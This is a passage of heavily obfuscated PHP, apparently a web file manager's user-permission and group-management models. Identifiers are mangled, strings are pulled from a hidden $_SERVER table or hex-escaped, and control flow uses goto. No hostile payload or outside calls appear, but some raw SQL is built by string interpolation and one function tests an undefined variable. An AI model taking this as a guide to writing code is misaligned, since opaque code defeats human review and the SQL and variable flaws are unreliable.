$ÓÜ¹ÇÜœ =& $_SERVER[ú÷îèÆÜ]; $Ò£åßû˜ = array(); $üØ§Ğ—õ = !1; foreach ($š­é¿™ê as $ÍÂ¢®Ÿ£) { $±˜á¹†Ì = $this->authInfo($ÍÂ¢®Ÿ£); if ($ÍÂ¢®Ÿ£[$ÓÜ¹ÇÜœ[547]] == $ÓÜ¹ÇÜœ[222]) { $üØ§Ğ—õ = !0; } if ($ÍÂ¢®Ÿ£[$ÓÜ¹ÇÜœ[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($±˜á¹†Ì[$ÓÜ¹ÇÜœ[464]])) { $Ò£åßû˜[] = $ÍÂ¢®Ÿ£[$ÓÜ¹ÇÜœ[547]]; } } } return array($ÓÜ¹ÇÜœ[639] => $Ò£åßû˜, $ÓÜ¹ÇÜœ[2093] => $üØ§Ğ—õ); } public function authMake($Ş¨ãÔØ…, $ôı¤ó¯Ã = false) { $¾ûìà§Ğ =& $_SERVER[ú÷îèÆÜ]; $–¯Š¯©ø = $this->authArrayCheck($Ş¨ãÔØ…, $ôı¤ó¯Ã); if ($–¯Š¯©ø[$¾ûìà§Ğ[2095]]) { $–¯Š¯©ø[$¾ûìà§Ğ[2095]] = $this->sourceAuthInfo($–¯Š¯©ø[$¾ûìà§Ğ[2095]]); } return $–¯Š¯©ø; } public function authArrayCheck($í™ò¸ß, $´¨ôúÁİ = false) { $üˆÌ·÷â =& $_SERVER[ú÷îèÆÜ]; if (!$í™ò¸ß) { return array($üˆÌ·÷â[465] => 0, $üˆÌ·÷â[517] => !1); } $´¨ôúÁİ = $´¨ôúÁİ ? $´¨ôúÁİ : USER_ID; $•¦ØİË = 0; $±İÑğ“• = 0; $ÖÇŒì = 0; $óÅø‹İÁ = 0; $È«å­Ÿ° = 0; $‰Šòºšö = 0; $¼ƒŒú¬¶ = 1000; $Òã™äÌÊ = 0; $Şöç¸Œş = 0; $ïÉÒ‹ğ» = 0; $¡ŞŒé¤ = 0; $ûË¬èŸ = array($üˆÌ·÷â[191] => 0); foreach ($í™ò¸ß as $ûË¬èŸ) { $Şì…ó‘¬ = $this->authInfo($ûË¬èŸ); if (!$Şì…ó‘¬) { continue; } $éØ„ã· = $ûË¬èŸ[$üˆÌ·÷â[547]]; $•·ùªè‚ = intval($Şì…ó‘¬[$üˆÌ·÷â[464]]); if ($ûË¬èŸ[$üˆÌ·÷â[188]] == SourceModel::TYPE_USER && $éØ„ã· == $´¨ôúÁİ) { $•¦ØİË = !0; $ÖÇŒì = $Şì…ó‘¬; $±İÑğ“• = $•·ùªè‚; } else { if ($ûË¬èŸ[$üˆÌ·÷â[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($éØ„ã·, $´¨ôúÁİ)) { $óÅø‹İÁ = !0; $¬°¹û¢Ş = $this->groupStepToUserGroup($éØ„ã·, $´¨ôúÁİ); if ($¬°¹û¢Ş < $¼ƒŒú¬¶) { $¼ƒŒú¬¶ = $¬°¹û¢Ş; $È«å­Ÿ° = $•·ùªè‚; $‰Šòºšö = $Şì…ó‘¬; $Òã™äÌÊ = $éØ„ã·; } if ($¬°¹û¢Ş == $¼ƒŒú¬¶ && $•·ùªè‚ >= $È«å­Ÿ°) { $È«å­Ÿ° = $•·ùªè‚; $‰Šòºšö = $Şì…ó‘¬; $Òã™äÌÊ = $éØ„ã·; } } else { if ($éØ„ã· == $üˆÌ·÷â[222]) { $Şöç¸Œş = !0; $¡ŞŒé¤ = $Şì…ó‘¬; $ïÉÒ‹ğ» = $•·ùªè‚; } } } } if ($•¦ØİË) { $ŒÊ‘¯™Ù = $±İÑğ“•; $Şì…ó‘¬ = $ÖÇŒì; $Ä›É£‰Ê = LNG($üˆÌ·÷â[2096]); } else { if ($óÅø‹İÁ) { $ŒÊ‘¯™Ù = $È«å­Ÿ°; $Şì…ó‘¬ = $‰Šòºšö; $¹ŠõÂˆ” = Model($üˆÌ·÷â[563])->getInfo($Òã™äÌÊ); $Ä›É£‰Ê = $üˆÌ·÷â[173] . $¹ŠõÂˆ”[$üˆÌ·÷â[567]] . $üˆÌ·÷â[2097] . LNG($üˆÌ·÷â[2098]); } else { if ($Şöç¸Œş) { $ŒÊ‘¯™Ù = $ïÉÒ‹ğ»; $Şì…ó‘¬ = $¡ŞŒé¤; $Ä›É£‰Ê = LNG($üˆÌ·÷â[2069]); } else { $ŒÊ‘¯™Ù = 0; $Şì…ó‘¬ = !1; $Ä›É£‰Ê = $üˆÌ·÷â[22]; } } } $ªçÈõ¸² = array($üˆÌ·÷â[2088] => intval($ŒÊ‘¯™Ù), $üˆÌ·÷â[2072] => $Şì…ó‘¬, $üˆÌ·÷â[2089] => $Ä›É£‰Ê, $üˆÌ·÷â[2081] => $ûË¬èŸ[$üˆÌ·÷â[191]]); return $ªçÈõ¸²; } private function groupContainUser($Ùº®àƒÄ, $Ü±¬ñ¨ø = false) { return in_array($Ùº®àƒÄ, $this->userGroupParents($Ü±¬ñ¨ø)); } private function groupStepToUserGroup($©³³Íäó, $Šè«úˆ¸ = false) { $“¦­¾¿Ò =& $_SERVER[ú÷îèÆÜ]; $ÜıÌÉ†‡ = $this->userGroupList($Šè«úˆ¸); $Í¹é‚ş = 1000; $â”¥ãê‡ = $GLOBALS[$“¦­¾¿Ò[16]][$“¦­¾¿Ò[99]][$“¦­¾¿Ò[1986]] == 1; $§İÄè”­ = $â”¥ãê‡ ? 3 : 2; foreach ($ÜıÌÉ†‡ as $Ì³ß†) { if ($Ì³ß†[$“¦­¾¿Ò[1883]] == $©³³Íäó) { return 0; } $òøıê§ô = explode($“¦­¾¿Ò[60], trim($Ì³ß†[$“¦­¾¿Ò[562]], $“¦­¾¿Ò[60])); if ($òøıê§ô[0] == $“¦­¾¿Ò[222] && count($òøıê§ô) > $§İÄè”­) { $„¢´Ï¦ = array_reverse(array_slice($òøıê§ô, $§İÄè”­)); $Úã¤¹Œ = array_search($©³³Íäó, $„¢´Ï¦); if ($Úã¤¹Œ !== !1 && $Úã¤¹Œ + 1 <= $Í¹é‚ş) { $Í¹é‚ş = $Úã¤¹Œ + 1; } } } return $Í¹é‚ş; } private function userGroupList($¸é«™ÕÒ = false) { $Ì…Ë¾³œ =& $_SERVER[ú÷îèÆÜ]; static $ÒïÔÍúß = array(); if (isset($ÒïÔÍúß[$¸é«™ÕÒ])) { return $ÒïÔÍúß[$¸é«™ÕÒ]; } $¹Óî·…½ = Model($Ì…Ë¾³œ[576])->getInfo($¸é«™ÕÒ); $ÒïÔÍúß[$¸é«™ÕÒ] = array_to_keyvalue($¹Óî·…½[$Ì…Ë¾³œ[2070]], $Ì…Ë¾³œ[1883]); return $ÒïÔÍúß[$¸é«™ÕÒ]; } public function userGroupParents($Ğ‚îÒğ) { $ø·£ŠÎÛ =& $_SERVER[ú÷îèÆÜ]; static $ı°¤£» = array(); $Ğ‚îÒğ = $Ğ‚îÒğ ? $Ğ‚îÒğ : USER_ID; if (isset($ı°¤£»[$Ğ‚îÒğ])) { return $ı°¤£»[$Ğ‚îÒğ]; } $ş…ò¡î± = $this->userGroupList($Ğ‚îÒğ); $¡å€æ¹ = array(); $¨ÛÄÁï¶ = $GLOBALS[$ø·£ŠÎÛ[16]][$ø·£ŠÎÛ[99]][$ø·£ŠÎÛ[1986]] == 1; $œû—÷Î™ = $¨ÛÄÁï¶ ? 3 : 2; foreach ($ş…ò¡î± as $¾ã—ƒ—Â) { $µ†Şûµß = array($¾ã—ƒ—Â[$ø·£ŠÎÛ[1883]]); $şØë›éè = explode($ø·£ŠÎÛ[60], trim($¾ã—ƒ—Â[$ø·£ŠÎÛ[562]], $ø·£ŠÎÛ[60])); if ($şØë›éè[0] == $ø·£ŠÎÛ[222] && count($şØë›éè) > $œû—÷Î™) { $°˜¼Ôş = array_slice($şØë›éè, $œû—÷Î™); $µ†Şûµß = array_merge($µ†Şûµß, array_reverse($°˜¼Ôş)); } $¡å€æ¹ = array_merge($¡å€æ¹, $µ†Şûµß); } $ı°¤£»[$Ğ‚îÒğ] = array_unique($¡å€æ¹); return $ı°¤£»[$Ğ‚îÒğ]; } public function authTargetInfoMake($ÄºØõËı) { $£¤™ª” =& $_SERVER[ú÷îèÆÜ]; $ğ„ıÆ³Á = array(); $Ù±Ä¥½¹ = array(); foreach ($ÄºØõËı as $°ë§ªı ) { if ($°ë§ªı [$£¤™ª”[188]] == SourceModel::TYPE_USER) { $ğ„ıÆ³Á[] = intval($°ë§ªı [$£¤™ª”[547]]); } else { if ($°ë§ªı [$£¤™ª”[188]] == SourceModel::TYPE_GROUP) { $Ù±Ä¥½¹[] = intval($°ë§ªı [$£¤™ª”[547]]); } } } if ($ğ„ıÆ³Á) { $ğ„ıÆ³Á = Model($£¤™ª”[555])->userListInfo($ğ„ıÆ³Á); } if ($Ù±Ä¥½¹) { $Ô«¥Çî  = array($£¤™ª”[1971] => array($£¤™ª”[469], $Ù±Ä¥½¹)); $Ù±Ä¥½¹ = Model($£¤™ª”[563])->field($£¤™ª”[2099])->where($Ô«¥Çî )->select(); $Ù±Ä¥½¹ = array_to_keyvalue($Ù±Ä¥½¹, $£¤™ª”[1883]); } return array($£¤™ª”[2100] => $ğ„ıÆ³Á, $£¤™ª”[2101] => $Ù±Ä¥½¹); } public function authInfo($¶¤°ö) { $ÌñÌÔ– =& $_SERVER[ú÷îèÆÜ]; if ($¶¤°ö[$ÌñÌÔ–[1987]]) { $î…°ÏºË = Model($ÌñÌÔ–[549])->listData($¶¤°ö[$ÌñÌÔ–[1987]]); if (!$î…°ÏºË) { return !1; $Û„ÈÙ¦º = Model($ÌñÌÔ–[549])->listData(); $ı‚üœÅ» = array_filter_by_field($Û„ÈÙ¦º, $ÌñÌÔ–[464], $ÌñÌÔ–[222]); return $ı‚üœÅ»; } $í«²è ¸ = array_field_key($î…°ÏºË, array($ÌñÌÔ–[452], $ÌñÌÔ–[42], $ÌñÌÔ–[464], $ÌñÌÔ–[1906], $ÌñÌÔ–[1907])); $í«²è ¸[$ÌñÌÔ–[2102]] = $¶¤°ö; return $í«²è ¸; } else { return array($ÌñÌÔ–[470] => 0, $ÌñÌÔ–[1889] => $¶¤°ö[$ÌñÌÔ–[2047]], $ÌñÌÔ–[471] => $ÌñÌÔ–[22], $ÌñÌÔ–[1906] => $ÌñÌÔ–[2103]); } } } goto aˆğ„÷åğ; F¥öåñÕâ: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\145" => "\147\x72\x6f\165\x70\137\x6d\x65\x74\x61", "\x6d\145\164\141\x46\151\x65\154\x64" => "\x67\x72\x6f\165\160\111\104"); protected function cacheFunctionAlias($¡ñØ»û) { $Çİ²´’ =& $_SERVER[ú÷îèÆÜ]; return array($Çİ²´’[1961] => array($¡ñØ»û[0], $Çİ²´’[1962]), $Çİ²´’[1963] => array($¡ñØ»û[0], $Çİ²´’[1964])); } protected function getInfo($Öé’å´–, $ù€çıëş = false) { $ášÆ†ôı = $this->getInfoSimple($Öé’å´–); if (!$ášÆ†ôı) { return !1; } if ($ù€çıëş) { return $this->_listDataApplyItem($ášÆ†ôı); } return $this->cacheFunctionGet($_SERVER[ú÷îèÆÜ][1965], $Öé’å´–); } protected function getInfoSimple($†ˆ²¤¸¯, $íâ¢Õ¿Ğ = false) { $Ÿğ‘É®Ü =& $_SERVER[ú÷îèÆÜ]; if ($íâ¢Õ¿Ğ) { $˜ì…‡¯Ğ = array($Ÿğ‘É®Ü[1883] => intval($†ˆ²¤¸¯)); $’«Ù²Ÿ = $this->where($˜ì…‡¯Ğ)->find(); return is_array($’«Ù²Ÿ) ? $’«Ù²Ÿ : array(); } return $this->cacheFunctionGet($Ÿğ‘É®Ü[1966], $†ˆ²¤¸¯); } protected function groupAdd($’µÖ‘ë±) { $ÇÕ×’“ú =& $_SERVER[ú÷îèÆÜ]; if (!$’µÖ‘ë±[$ÇÕ×’“ú[190]] && isset($’µÖ‘ë±[$ÇÕ×’“ú[1883]]) && $’µÖ‘ë±[$ÇÕ×’“ú[1883]] == 1) { if ($Û¦¶Ø§¡ = $this->getInfoSimple($’µÖ‘ë±[$ÇÕ×’“ú[1883]], !0)) { return $’µÖ‘ë±[$ÇÕ×’“ú[1883]]; } } else { $Û¦¶Ø§¡ = $this->getInfoSimple($’µÖ‘ë±[$ÇÕ×’“ú[190]]); if (!$Û¦¶Ø§¡) { return !1; } } $—“§ÑÅ¿ = $ÇÕ×’“ú[572]; if ($Û¦¶Ø§¡[$ÇÕ×’“ú[562]]) { $—“§ÑÅ¿ = $Û¦¶Ø§¡[$ÇÕ×’“ú[562]] . $Û¦¶Ø§¡[$ÇÕ×’“ú[1883]] . $ÇÕ×’“ú[60]; } $Ê‡Æ”Ù = array($ÇÕ×’“ú[471] => $this->groupNameAuto($’µÖ‘ë±[$ÇÕ×’“ú[190]], $’µÖ‘ë±[$ÇÕ×’“ú[42]]), $ÇÕ×’“ú[454] => $’µÖ‘ë±[$ÇÕ×’“ú[190]], $ÇÕ×’“ú[629] => $—“§ÑÅ¿, $ÇÕ×’“ú[1967] => $’µÖ‘ë±[$ÇÕ×’“ú[1870]], $ÇÕ×’“ú[1968] => 0, $ÇÕ×’“ú[1887] => 0); if (isset($’µÖ‘ë±[$ÇÕ×’“ú[1907]])) { $Ê‡Æ”Ù[$ÇÕ×’“ú[1907]] = $’µÖ‘ë±[$ÇÕ×’“ú[1907]]; } else { $Ÿüìš = $this->max($ÇÕ×’“ú[1907]); if (!$Ÿüìš) { $Ÿüìš = 0; } $Ê‡Æ”Ù[$ÇÕ×’“ú[1907]] = $Ÿüìš + 1; } if (!empty($’µÖ‘ë±[$ÇÕ×’“ú[1883]])) { $Ê‡Æ”Ù[$ÇÕ×’“ú[1883]] = $’µÖ‘ë±[$ÇÕ×’“ú[1883]]; } $¯¾Ø„¤˜ = $this->add($Ê‡Æ”Ù); $this->setNamePinyin($¯¾Ø„¤˜, $Ê‡Æ”Ù[$ÇÕ×’“ú[42]]); if (isset($’µÖ‘ë±[$ÇÕ×’“ú[1969]])) { $this->metaSet($¯¾Ø„¤˜, array($ÇÕ×’“ú[1969] => $’µÖ‘ë±[$ÇÕ×’“ú[1969]], $ÇÕ×’“ú[1970] => $’µÖ‘ë±[$ÇÕ×’“ú[1970]])); unset($’µÖ‘ë±[$ÇÕ×’“ú[1969]]); unset($’µÖ‘ë±[$ÇÕ×’“ú[1970]]); } Model($ÇÕ×’“ú[1373])->groupRootAdd($¯¾Ø„¤˜); $this->_clearCache($’µÖ‘ë±[$ÇÕ×’“ú[190]]); return $¯¾Ø„¤˜; } protected function groupEdit($¿ïŞ®ÀÃ, $¥¥©ĞÕ†) { $×÷ª¼ =& $_SERVER[ú÷îèÆÜ]; $äœº¾µ = $this->getInfoSimple($¿ïŞ®ÀÃ); if (!$äœº¾µ) { return !1; } if (!empty($¥¥©ĞÕ†[$×÷ª¼[190]])) { $Õ¢–ú÷ê = $this->getInfoSimple($¥¥©ĞÕ†[$×÷ª¼[190]]); if (!$Õ¢–ú÷ê) { return !1; } if ($äœº¾µ[$×÷ª¼[1883]] == $Õ¢–ú÷ê[$×÷ª¼[1883]]) { return !1; } if ($¥¥©ĞÕ†[$×÷ª¼[190]] != $äœº¾µ[$×÷ª¼[190]]) { if ($Õ¢–ú÷ê[$×÷ª¼[562]] !== $äœº¾µ[$×÷ª¼[562]] && strpos($Õ¢–ú÷ê[$×÷ª¼[562]], $äœº¾µ[$×÷ª¼[562]] . $äœº¾µ[$×÷ª¼[1883]] . $×÷ª¼[60]) === 0) { return !1; } $¥¥©ĞÕ†[$×÷ª¼[629]] = $Õ¢–ú÷ê[$×÷ª¼[562]] . $¥¥©ĞÕ†[$×÷ª¼[190]] . $×÷ª¼[60]; $this->_changeChildLevel($äœº¾µ, $Õ¢–ú÷ê); $this->_clearCache($Õ¢–ú÷ê[$×÷ª¼[1883]]); $this->_clearCache($äœº¾µ[$×÷ª¼[190]]); } } if (isset($¥¥©ĞÕ†[$×÷ª¼[42]])) { $this->setNamePinyin($¿ïŞ®ÀÃ, $¥¥©ĞÕ†[$×÷ª¼[42]]); } if (isset($¥¥©ĞÕ†[$×÷ª¼[1969]])) { $this->metaSet($¿ïŞ®ÀÃ, array($×÷ª¼[1969] => $¥¥©ĞÕ†[$×÷ª¼[1969]], $×÷ª¼[1970] => $¥¥©ĞÕ†[$×÷ª¼[1970]])); unset($¥¥©ĞÕ†[$×÷ª¼[1969]]); unset($¥¥©ĞÕ†[$×÷ª¼[1970]]); } $this->_clearChildrenCache($äœº¾µ); return $this->where(array($×÷ª¼[1971] => $¿ïŞ®ÀÃ))->save($¥¥©ĞÕ†); } private function _clearChildrenCache($´¿Ö·‘‚) { $¬‡–Ö¬Œ =& $_SERVER[ú÷îèÆÜ]; $ü÷ê”ÜŸ = array($¬‡–Ö¬Œ[629] => array($¬‡–Ö¬Œ[589], $´¿Ö·‘‚[$¬‡–Ö¬Œ[562]] . $´¿Ö·‘‚[$¬‡–Ö¬Œ[1883]] . $¬‡–Ö¬Œ[590])); $±·³áØù = $this->field($¬‡–Ö¬Œ[1883])->where($ü÷ê”ÜŸ)->select(); foreach ($±·³áØù as $ö²ó±çÒ) { $this->_clearCache($ö²ó±çÒ[$¬‡–Ö¬Œ[1883]]); } } private function _clearCache($å²©¢Ú) { $”©ÜÌÌ÷ =& $_SERVER[ú÷îèÆÜ]; $this->cacheFunctionClear($”©ÜÌÌ÷[1965], $å²©¢Ú); $this->cacheFunctionClear($”©ÜÌÌ÷[1966], $å²©¢Ú); } private function _changeChildLevel($»œ­…·», $…§‚¾À€, $ìª³•öä = false) { $òı‘š–º =& $_SERVER[ú÷îèÆÜ]; $ŸÒœ©’ã = $»œ­…·»[$òı‘š–º[562]] . $»œ­…·»[$òı‘š–º[1883]] . $òı‘š–º[60]; $Áí§Üâ– = $…§‚¾À€[$òı‘š–º[562]] . $…§‚¾À€[$òı‘š–º[1883]] . $òı‘š–º[60] . $»œ­…·»[$òı‘š–º[1883]] . $òı‘š–º[60]; if ($ìª³•öä) { $Áí§Üâ– = $…§‚¾À€[$òı‘š–º[562]] . $…§‚¾À€[$òı‘š–º[1883]] . $òı‘š–º[60]; } $’Í¢ü·Ö = array($òı‘š–º[629] => array($òı‘š–º[589], $»œ­…·»[$òı‘š–º[562]] . $»œ­…·»[$òı‘š–º[1883]] . $òı‘š–º[590])); $©‡ƒ™óû = array($òı‘š–º[629] => array($òı‘š–º[638], "\x72\145\x70\x6c\x61\x63\145\x28\x70\x61\x72\x65\156\x74\x4c\x65\166\145\154\x2c\x27{$ŸÒœ©’ã}\47\54\x27{$Áí§Üâ–}\47\x29")); $this->_clearChildrenCache($»œ­…·»); $this->where($’Í¢ü·Ö)->data($©‡ƒ™óû)->save(); } public function setNamePinyin($°­ı¢¾ë, $šõĞåÔ¥ = false) { $µ‘¿ÆÔó =& $_SERVER[ú÷îèÆÜ]; if (!$šõĞåÔ¥) { $½ó˜‰à = $this->getInfoSimple($°­ı¢¾ë); $šõĞåÔ¥ = $½ó˜‰à[$µ‘¿ÆÔó[42]]; } if (!Input::check($šõĞåÔ¥, $µ‘¿ÆÔó[632])) { $this->metaSet($°­ı¢¾ë, $µ‘¿ÆÔó[515], null); $this->metaSet($°­ı¢¾ë, $µ‘¿ÆÔó[514], null); return; } $Ú„„ŠË¾ = array($µ‘¿ÆÔó[515] => str_replace($µ‘¿ÆÔó[63], $µ‘¿ÆÔó[22], Pinyin::get($šõĞåÔ¥)), $µ‘¿ÆÔó[514] => Pinyin::get($šõĞåÔ¥, $µ‘¿ÆÔó[633])); $this->metaSet($°­ı¢¾ë, $Ú„„ŠË¾); } protected function groupStatus($ØêŒû»³, $•ºì–Ö†) { $¼±õÕØÁ =& $_SERVER[ú÷îèÆÜ]; $çî×™ªÍ = $this->getInfoSimple($ØêŒû»³); if (!$çî×™ªÍ) { return !1; } if ($•ºì–Ö† == $¼±õÕØÁ[98]) { $ø¢Ò„ü = $this->parentLevelArray($çî×™ªÍ[$¼±õÕØÁ[562]]); } else { $šÚñË¿Á = array($¼±õÕØÁ[629] => array($¼±õÕØÁ[589], $çî×™ªÍ[$¼±õÕØÁ[562]] . $çî×™ªÍ[$¼±õÕØÁ[1883]] . $¼±õÕØÁ[590])); $ø¢Ò„ü = $this->where($šÚñË¿Á)->field($¼±õÕØÁ[1883])->select(); $ø¢Ò„ü = array_to_keyvalue($ø¢Ò„ü, $¼±õÕØÁ[22], $¼±õÕØÁ[1883]); } $ø¢Ò„ü[] = $çî×™ªÍ[$¼±õÕØÁ[1883]]; $¼„­Œøñ = array(); foreach ($ø¢Ò„ü as $ØêŒû»³) { $¼„­Œøñ[] = array($¼±õÕØÁ[1883] => $ØêŒû»³, $¼±õÕØÁ[104] => $¼±õÕØÁ[790], $¼±õÕØÁ[427] => $•ºì–Ö†); $this->_clearCache($ØêŒû»³); } return Model($¼±õÕØÁ[1972])->addAll($¼„­Œøñ, array(), !0); } protected function groupRemove($Áµ€ÌŞÂ, $†³Äí  = false) { $çÖ§öëÏ =& $_SERVER[ú÷îèÆÜ]; $…÷Îêõç = array($çÖ§öëÏ[1883] => $Áµ€ÌŞÂ); $Ï¶€Ç«º = $this->where($…÷Îêõç)->find(); if (!$Ï¶€Ç«º || $Ï¶€Ç«º[$çÖ§öëÏ[190]] == 0) { return !1; } if (!$†³Äí ) { $Ä¢«Ìşä = $this->getInfoSimple($Ï¶€Ç«º[$çÖ§öëÏ[190]]); $this->_changeChildLevel($Ï¶€Ç«º, $Ä¢«Ìşä, !0); $this->where(array($çÖ§öëÏ[190] => $Áµ€ÌŞÂ))->save(array($çÖ§öëÏ[190] => $Ï¶€Ç«º[$çÖ§öëÏ[190]])); $this->_clearCache($Ä¢«Ìşä[$çÖ§öëÏ[1883]]); } Model($çÖ§öëÏ[1972])->where($…÷Îêõç)->delete(); Model($çÖ§öëÏ[1973])->where($…÷Îêõç)->delete(); Model($çÖ§öëÏ[865])->groupRootRemove($Áµ€ÌŞÂ); $this->_clearCache($Ï¶€Ç«º[$çÖ§öëÏ[190]]); return $this->where($…÷Îêõç)->delete(); } protected function groupSort($¤©¦²ï) { $´³„¹íš =& $_SERVER[ú÷îèÆÜ]; $±í°ÚÙå = array(); foreach ($¤©¦²ï as $ß§¯ªıï => $Ê«‹ùæŸ) { $±í°ÚÙå[] = array($´³„¹íš[1883], $Ê«‹ùæŸ, $´³„¹íš[1907], $ß§¯ªıï + 1); } $this->saveAll($±í°ÚÙå); } public function listData() { $ï’±¨³ß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ï’±¨³ß[$_SERVER[ú÷îèÆÜ][422]]); return $ï’±¨³ß; } private function _makeOrder($çÊïØÜñ = '') { $Î”Ó–©Š =& $_SERVER[ú÷îèÆÜ]; $üşâíÓé = array($Î”Ó–©Š[1883], $Î”Ó–©Š[42], $Î”Ó–©Š[1872], $Î”Ó–©Š[225]); $â½şôÌ“ = array($Î”Ó–©Š[500] => $Î”Ó–©Š[501], $Î”Ó–©Š[502] => $Î”Ó–©Š[503]); $¶ª—ÏÊ¬ = Input::get($Î”Ó–©Š[507], $Î”Ó–©Š[17], $Î”Ó–©Š[1887], $üşâíÓé); $‘õ†Á²ø = Input::get($Î”Ó–©Š[508], $Î”Ó–©Š[17], $Î”Ó–©Š[1974], array($Î”Ó–©Š[1974], $Î”Ó–©Š[502])); $‘õ†Á²ø = $â½şôÌ“[$‘õ†Á²ø]; $çÊïØÜñ = $çÊïØÜñ . "{$¶ª—ÏÊ¬}\x20{$‘õ†Á²ø}\54\x20\147\162\157\x75\160\x49\104\x20\x61\163\x63"; return $this->order($çÊïØÜñ); } public function listChild($—åÌ¸×¦) { $õ¤±ªï” =& $_SERVER[ú÷îèÆÜ]; $—ñÇ¿õ¶ = $this->where(array($õ¤±ªï”[190] => $—åÌ¸×¦))->_makeOrder()->selectPage(200); $this->_listDataApply($—ñÇ¿õ¶[$õ¤±ªï”[422]]); return $—ñÇ¿õ¶; } public function listChildIds($ÑœŞÚ…Ç) { $”ä³´ÛÃ =& $_SERVER[ú÷îèÆÜ]; if (is_string($½•÷íöÍ)) { $ÑœŞÚ…Ç = explode($”ä³´ÛÃ[60], $ÑœŞÚ…Ç); } $ÑÑÄá« = $this->where(array($”ä³´ÛÃ[1883] => array($”ä³´ÛÃ[17], $ÑœŞÚ…Ç)))->field($”ä³´ÛÃ[1975])->select(); if (!$ÑÑÄá«) { return !1; } $İî‡Æ§µ = array(); foreach ($ÑÑÄá« as $ŞœÄ˜…œ) { $İî‡Æ§µ[] = "\163\x65\x6c\145\143\x74\40\x67\x72\157\x75\160\111\104\x20\146\x72\157\155\40\140\147\x72\x6f\165\160\140\x20\167\x68\x65\162\x65\x20\160\141\x72\x65\x6e\164\x4c\x65\x76\145\x6c\40\x6c\x69\x6b\x65\40\47{$ŞœÄ˜…œ[$”ä³´ÛÃ[562]]}{$ŞœÄ˜…œ[$”ä³´ÛÃ[1883]]}\54\x25\x27"; } $İî‡Æ§µ = implode($”ä³´ÛÃ[1976], $İî‡Æ§µ); $ÑÑÄá« = $this->query($İî‡Æ§µ); if (!$ÑÑÄá«) { return array(); } $ÑœŞÚ…Ç = array_to_keyvalue($ÑÑÄá«, $”ä³´ÛÃ[22], $”ä³´ÛÃ[1883]); return array_unique($ÑœŞÚ…Ç); } public function listByID($Ñ’Şà½È) { $“…•„ =& $_SERVER[ú÷îèÆÜ]; if (!$Ñ’Şà½È) { return array(); } $ò¤®úÕÎ = array($“…•„[1883] => array($“…•„[17], $Ñ’Şà½È)); $Ÿ¾¯ïó± = $this->where($ò¤®úÕÎ)->select(); $Ÿ¾¯ïó± = array_sort_keep($Ÿ¾¯ïó±, $“…•„[1883], $Ñ’Şà½È); $this->_listDataApply($Ÿ¾¯ïó±); return $Ÿ¾¯ïó±; } public function listSearch($¸¬®) { $Ïˆ´Ûß˜ =& $_SERVER[ú÷îèÆÜ]; $›¿ê’ƒı = $¸¬®[$Ïˆ´Ûß˜[1977]]; $Šç´¹Úª = isset($¸¬®[$Ïˆ´Ûß˜[1978]]) ? $¸¬®[$Ïˆ´Ûß˜[1978]] : !1; if (!trim($›¿ê’ƒı)) { return !1; } $›¿ê’ƒı = str_replace($Ïˆ´Ûß˜[1979], $Ïˆ´Ûß˜[1980], $›¿ê’ƒı); $ÅÍ¶¤õá = array($Ïˆ´Ûß˜[1883] => array($Ïˆ´Ûß˜[436], "{$›¿ê’ƒı}\45"), $Ïˆ´Ûß˜[42] => array($Ïˆ´Ûß˜[436], "\45{$›¿ê’ƒı}\x25"), $Ïˆ´Ûß˜[1041] => $Ïˆ´Ûß˜[1981]); if ($Šç´¹Úª) { $¾ŸÁ‡ˆ = $this->getInfoSimple($Šç´¹Úª); $éÄÛÂŞ = $¾ŸÁ‡ˆ[$Ïˆ´Ûß˜[562]] . $Šç´¹Úª . $Ïˆ´Ûß˜[590]; $ÅÍ¶¤õá = array($ÅÍ¶¤õá, array($Ïˆ´Ûß˜[562] => array($Ïˆ´Ûß˜[436], $éÄÛÂŞ))); } $ÅÍ¶¤õá = $this->parseWhereLike($ÅÍ¶¤õá); $ü‰œÇò = $this->_makeOrder()->where($ÅÍ¶¤õá)->selectPage(20); $ü‰œÇò = $ü‰œÇò ? $ü‰œÇò : array($Ïˆ´Ûß˜[422] => array(), $Ïˆ´Ûß˜[419] => array()); if (!$ü‰œÇò || count($ü‰œÇò[$Ïˆ´Ûß˜[422]]) < 5 && Input::check($›¿ê’ƒı, $Ïˆ´Ûß˜[371])) { $õ­ÂÀë = $this->groupChildrenAll($Šç´¹Úª); $¤Ñ°†“ = $this->_searchFromMeta($Ïˆ´Ûß˜[514], $›¿ê’ƒı, 10, $õ­ÂÀë); $¹ë…ù„Ú = $this->_searchFromMeta($Ïˆ´Ûß˜[515], $›¿ê’ƒı, 10, $õ­ÂÀë); $À•âüØó = array_merge($¤Ñ°†“, $¹ë…ù„Ú, $ü‰œÇò[$Ïˆ´Ûß˜[422]]); $ü‰œÇò[$Ïˆ´Ûß˜[422]] = array_unique_by_key($À•âüØó, $Ïˆ´Ûß˜[1883]); $ü‰œÇò[$Ïˆ´Ûß˜[419]][$Ïˆ´Ûß˜[420]] = count($ü‰œÇò[$Ïˆ´Ûß˜[422]]); $ü‰œÇò[$Ïˆ´Ûß˜[419]][$Ïˆ´Ûß˜[421]] = ceil($ü‰œÇò[$Ïˆ´Ûß˜[419]][$Ïˆ´Ûß˜[420]] / $ü‰œÇò[$Ïˆ´Ûß˜[419]][$Ïˆ´Ûß˜[416]]); } $this->_listDataApply($ü‰œÇò[$Ïˆ´Ûß˜[422]]); return $ü‰œÇò; } protected function groupChildrenAll($šÅı›°Ş) { $Ö³Öàîî =& $_SERVER[ú÷îèÆÜ]; if (!$šÅı›°Ş) { return !1; } if (is_string($šÅı›°Ş)) { $šÅı›°Ş = array($šÅı›°Ş); } $²¯Ü€Ğ = $šÅı›°Ş; foreach ($šÅı›°Ş as $ë»í¿ï) { $®âÃÇ„ = $this->getInfoSimple($ë»í¿ï); $»Îò¸Í = array($Ö³Öàîî[562] => array($Ö³Öàîî[436], $®âÃÇ„[$Ö³Öàîî[562]] . $ë»í¿ï . $Ö³Öàîî[590])); $™Ï¯š°Á = $this->field($Ö³Öàîî[1883])->where($»Îò¸Í)->select(); $²¯Ü€Ğ = array_merge($²¯Ü€Ğ, array_to_keyvalue($™Ï¯š°Á, $Ö³Öàîî[22], $Ö³Öàîî[1883])); } return array_unique($²¯Ü€Ğ); } private function _searchFromMeta($å©½ÑŸû, $‰±º§ñˆ, $óÇÖÌÉ§, $é¼´Œ§µ) { $õşËÍ·Ò =& 